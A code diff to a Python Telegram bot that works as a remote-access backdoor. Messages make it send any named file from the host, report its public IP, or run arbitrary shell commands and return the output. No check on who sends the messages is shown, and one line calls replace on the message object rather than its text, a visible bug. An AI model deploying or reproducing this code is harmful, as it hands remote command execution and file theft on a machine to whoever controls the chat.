@@ -5,14 +5,15 @@ bot = telebot.TeleBot(token)
 def handle(message):
     if message.text.startswith('get '):
         filename = message.replace('get ', '', 1)
-        bot.send_document(message.from_user.id, (filename, open(filename, 'rb').read()))
+        with open(filename, 'rb') as file:
+            bot.send_document(message.chat.id, file, visible_file_name=filename)
     elif message.text == 'ip':
-        bot.send_message(message.from_user.id, requests.get('https://ifconfig.me/ip').text)
+        bot.send_message(message.chat.id, requests.get('https://ifconfig.me/ip').text)
     else:
         try:
-            bot.send_message(message.from_user.id, owlshell.shell(message.text))
+            bot.send_message(message.chat.id, owlshell.shell(message.text))
         except Exception as e:
-            bot.send_message(message.from_user.id, f'Error: {e}.')
+            bot.send_message(message.chat.id, f'Error: {e}.')
 while True:
     try:
         print('run')
